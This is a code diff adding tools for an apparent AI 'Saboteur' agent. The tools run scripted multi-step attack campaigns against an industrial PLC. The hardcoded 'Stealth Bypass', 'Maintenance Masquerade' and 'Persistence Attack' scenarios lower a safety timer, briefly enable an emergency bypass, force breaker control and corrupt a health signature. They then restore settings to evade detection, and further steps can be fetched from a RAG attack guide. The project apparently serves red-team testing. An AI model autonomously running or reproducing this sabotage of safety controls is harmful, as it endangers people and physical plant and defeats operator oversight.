@@ -850,3 +850,365 @@ def establish_covert_channel(target_ip: str, enable_debug: bool = True, monitor_
     
     print("--- SABOTEUR/TOOL (CovertChannel): Covert channel packets crafted successfully. ---")
     return str(attack_result)
+
+# --- ADVANCED SCENARIO EXECUTION TOOLKIT ---
+# High-level orchestration tools for executing complete attack campaigns
+
+@tool
+def execute_attack_scenario(target_ip: str, scenario_name: str, execution_delay: int = 2) -> str:
+    """
+    Execute a complete multi-step attack scenario from the RED_TEAM_ATTACK_GUIDE.
+    This is the most advanced Saboteur capability - autonomous campaign execution.
+    
+    Args:
+        target_ip: The IP address of the target PLC.
+        scenario_name: Name of scenario to execute ("Stealth Bypass", "Maintenance Masquerade", "Persistence Attack").
+        execution_delay: Delay between steps in seconds (default 2, can be adjusted for stealth).
+    
+    Returns:
+        String describing the complete scenario execution with step-by-step results.
+    """
+    print(f"--- SABOTEUR/SCENARIO: Executing {scenario_name} scenario on {target_ip} ---")
+    
+    # Import RAG service for scenario parsing
+    rag_service = None
+    rag_available = False
+    try:
+        from rag_service import rag_service
+        rag_available = rag_service.is_available()
+    except ImportError:
+        rag_available = False
+        print("--- SABOTEUR/WARNING: RAG service not available, using hardcoded scenarios ---")
+    
+    scenario_steps = []
+    scenario_metadata = {}
+    
+    # Parse scenario using RAG or fallback to hardcoded
+    if rag_available and rag_service:
+        try:
+            # Query RAG for scenario details
+            rag_query = f"attack scenario {scenario_name} steps modbus commands sequence"
+            rag_response = rag_service.query_document(rag_query)
+            
+            # Parse RAG response to extract steps
+            scenario_steps, scenario_metadata = _parse_scenario_from_rag(rag_response, scenario_name)
+            print(f"--- SABOTEUR/SCENARIO: Parsed {len(scenario_steps)} steps from RAG ---")
+            
+        except Exception as e:
+            print(f"--- SABOTEUR/WARNING: RAG parsing failed: {e}, using fallback ---")
+            rag_available = False
+    
+    # Fallback to hardcoded scenarios if RAG fails
+    if not rag_available or not scenario_steps:
+        scenario_steps, scenario_metadata = _get_hardcoded_scenario(scenario_name)
+        print(f"--- SABOTEUR/SCENARIO: Using hardcoded scenario with {len(scenario_steps)} steps ---")
+    
+    if not scenario_steps:
+        error_msg = f"Unknown scenario: {scenario_name}. Available: Stealth Bypass, Maintenance Masquerade, Persistence Attack"
+        print(f"--- SABOTEUR/ERROR: {error_msg} ---")
+        return error_msg
+    
+    # Execute scenario step by step
+    execution_log = {
+        "scenario": scenario_name,
+        "target": target_ip,
+        "metadata": scenario_metadata,
+        "steps_executed": [],
+        "total_steps": len(scenario_steps),
+        "execution_status": "in_progress",
+        "start_time": time.strftime("%Y-%m-%d %H:%M:%S")
+    }
+    
+    print(f"--- SABOTEUR/SCENARIO: Starting execution of {len(scenario_steps)} steps ---")
+    
+    for step_num, step in enumerate(scenario_steps, 1):
+        print(f"--- SABOTEUR/SCENARIO: Step {step_num}/{len(scenario_steps)}: {step['description']} ---")
+        
+        try:
+            # Execute the step
+            step_result = _execute_scenario_step(step, target_ip)
+            
+            execution_log["steps_executed"].append({
+                "step_number": step_num,
+                "description": step["description"],
+                "command": step.get("command", "N/A"),
+                "result": step_result,
+                "status": "success",
+                "timestamp": time.strftime("%H:%M:%S")
+            })
+            
+            print(f"--- SABOTEUR/SCENARIO: Step {step_num} completed successfully ---")
+            
+            # Handle timing/delays
+            if step.get("delay_after", 0) > 0:
+                delay = step["delay_after"]
+                print(f"--- SABOTEUR/SCENARIO: Waiting {delay}s before next step ---")
+                time.sleep(delay)
+            elif step_num < len(scenario_steps):  # Don't delay after last step
+                print(f"--- SABOTEUR/SCENARIO: Standard delay {execution_delay}s ---")
+                time.sleep(execution_delay)
+                
+        except Exception as e:
+            error_msg = f"Step {step_num} failed: {str(e)}"
+            print(f"--- SABOTEUR/SCENARIO ERROR: {error_msg} ---")
+            
+            execution_log["steps_executed"].append({
+                "step_number": step_num,
+                "description": step["description"],
+                "command": step.get("command", "N/A"),
+                "result": error_msg,
+                "status": "failed",
+                "timestamp": time.strftime("%H:%M:%S")
+            })
+            
+            # Decide whether to continue or abort
+            if step.get("critical", True):
+                execution_log["execution_status"] = "failed"
+                break
+            else:
+                print("--- SABOTEUR/SCENARIO: Non-critical step failed, continuing ---")
+    
+    # Complete execution logging
+    if execution_log["execution_status"] == "in_progress":
+        execution_log["execution_status"] = "completed"
+    
+    execution_log["end_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
+    
+    success_count = sum(1 for step in execution_log["steps_executed"] if step["status"] == "success")
+    print(f"--- SABOTEUR/SCENARIO: Scenario execution completed: {success_count}/{len(scenario_steps)} steps successful ---")
+    
+    return str(execution_log)
+
+def _parse_scenario_from_rag(rag_response: str, scenario_name: str) -> tuple:
+    """
+    Parse a scenario from RAG response text.
+    
+    Returns:
+        Tuple of (steps_list, metadata_dict)
+    """
+    steps = []
+    metadata = {"source": "RAG", "scenario": scenario_name}
+    
+    # Look for numbered steps in RAG response
+    lines = rag_response.split('\n')
+    current_step = None
+    
+    for line in lines:
+        line = line.strip()
+        
+        # Match numbered steps like "1. Enable debug mode..."
+        import re
+        step_match = re.match(r'^(\d+)\.\s*(.+)', line)
+        if step_match:
+            step_num = int(step_match.group(1))
+            step_desc = step_match.group(2)
+            
+            # Extract modbus command if present
+            modbus_match = re.search(r'`(modbus [^`]+)`', step_desc)
+            modbus_cmd = modbus_match.group(1) if modbus_match else None
+            
+            # Parse timing hints
+            delay = 0
+            if "wait" in step_desc.lower():
+                # Extract wait time if specified
+                wait_match = re.search(r'(\d+)\s*sec', step_desc.lower())
+                if wait_match:
+                    delay = int(wait_match.group(1))
+                else:
+                    delay = 5  # Default wait time
+            
+            steps.append({
+                "step_number": step_num,
+                "description": step_desc,
+                "modbus_command": modbus_cmd,
+                "delay_after": delay,
+                "critical": "cleanup" not in step_desc.lower()  # Cleanup steps are non-critical
+            })
+    
+    return steps, metadata
+
+def _get_hardcoded_scenario(scenario_name: str) -> tuple:
+    """
+    Get hardcoded scenario definitions as fallback.
+    
+    Returns:
+        Tuple of (steps_list, metadata_dict)
+    """
+    scenarios = {
+        "Stealth Bypass": {
+            "metadata": {
+                "source": "hardcoded",
+                "stealth_level": "HIGH",
+                "complexity": "ADVANCED",
+                "description": "Multi-step stealth attack avoiding detection"
+            },
+            "steps": [
+                {
+                    "step_number": 1,
+                    "description": "Enable debug mode for reconnaissance",
+                    "command": "establish_covert_channel",
+                    "args": {"enable_debug": True, "monitor_channel": False},
+                    "delay_after": 0,
+                    "critical": False
+                },
+                {
+                    "step_number": 2, 
+                    "description": "Reduce safety timer slightly",
+                    "command": "manipulate_safety_timer",
+                    "args": {"timer_value": 75},
+                    "delay_after": 5,
+                    "critical": True
+                },
+                {
+                    "step_number": 3,
+                    "description": "Wait for normal operation window",
+                    "command": "wait",
+                    "args": {},
+                    "delay_after": 10,
+                    "critical": False
+                },
+                {
+                    "step_number": 4,
+                    "description": "Activate emergency bypass briefly",
+                    "command": "activate_emergency_bypass",
+                    "args": {"enable": True},
+                    "delay_after": 3,
+                    "critical": True
+                },
+                {
+                    "step_number": 5,
+                    "description": "Disable emergency bypass",
+                    "command": "activate_emergency_bypass", 
+                    "args": {"enable": False},
+                    "delay_after": 2,
+                    "critical": False
+                },
+                {
+                    "step_number": 6,
+                    "description": "Restore safety timer",
+                    "command": "manipulate_safety_timer",
+                    "args": {"timer_value": 100},
+                    "delay_after": 2,
+                    "critical": False
+                },
+                {
+                    "step_number": 7,
+                    "description": "Disable debug mode",
+                    "command": "establish_covert_channel",
+                    "args": {"enable_debug": False, "monitor_channel": False},
+                    "delay_after": 0,
+                    "critical": False
+                }
+            ]
+        },
+        
+        "Maintenance Masquerade": {
+            "metadata": {
+                "source": "hardcoded",
+                "stealth_level": "LOW",
+                "complexity": "SIMPLE",
+                "description": "Quick maintenance override attack"
+            },
+            "steps": [
+                {
+                    "step_number": 1,
+                    "description": "Activate maintenance override",
+                    "command": "maintenance_override_bypass",
+                    "args": {},
+                    "delay_after": 5,
+                    "critical": True
+                },
+                {
+                    "step_number": 2,
+                    "description": "Control breaker directly via override",
+                    "command": "wait",
+                    "args": {},
+                    "delay_after": 10,
+                    "critical": True
+                },
+                {
+                    "step_number": 3,
+                    "description": "Clean up maintenance override",
+                    "command": "maintenance_override_bypass",
+                    "args": {},  # Would need a disable version
+                    "delay_after": 0,
+                    "critical": False
+                }
+            ]
+        },
+        
+        "Persistence Attack": {
+            "metadata": {
+                "source": "hardcoded", 
+                "stealth_level": "LOW",
+                "complexity": "SIMPLE",
+                "description": "Establish persistent compromised state"
+            },
+            "steps": [
+                {
+                    "step_number": 1,
+                    "description": "Corrupt health signature for persistence",
+                    "command": "corrupt_system_health_signature",
+                    "args": {"corruption_value": 999999},
+                    "delay_after": 5,
+                    "critical": True
+                },
+                {
+                    "step_number": 2,
+                    "description": "Establish covert communication channel",
+                    "command": "establish_covert_channel",
+                    "args": {"enable_debug": True, "monitor_channel": True},
+                    "delay_after": 0,
+                    "critical": False
+                }
+            ]
+        }
+    }
+    
+    scenario = scenarios.get(scenario_name)
+    if scenario:
+        return scenario["steps"], scenario["metadata"]
+    else:
+        return [], {}
+
+def _execute_scenario_step(step: dict, target_ip: str) -> str:
+    """
+    Execute a single scenario step.
+    
+    Args:
+        step: Step dictionary with command and args
+        target_ip: Target IP address
+        
+    Returns:
+        String result of step execution
+    """
+    command = step.get("command")
+    args = step.get("args", {})
+    
+    # Add target_ip to args if not present
+    if "target_ip" not in args:
+        args["target_ip"] = target_ip
+    
+    # Map commands to functions
+    command_map = {
+        "maintenance_override_bypass": maintenance_override_bypass,
+        "manipulate_safety_timer": manipulate_safety_timer,
+        "activate_emergency_bypass": activate_emergency_bypass,
+        "corrupt_system_health_signature": corrupt_system_health_signature,
+        "establish_covert_channel": establish_covert_channel,
+        "wait": lambda **kwargs: f"WAIT: {kwargs.get('delay', 5)}s delay executed"
+    }
+    
+    if command == "wait":
+        # Special handling for wait commands
+        delay = step.get("delay_after", 5)
+        return f"Wait period of {delay} seconds"
+    
+    elif command in command_map:
+        # Execute the mapped function
+        func = command_map[command]
+        result = func.invoke(args)
+        return f"Command {command} executed: {result[:100]}..." if len(str(result)) > 100 else f"Command {command} executed: {result}"
+    
+    else:
+        return f"SIMULATED: {command} with args {args}"
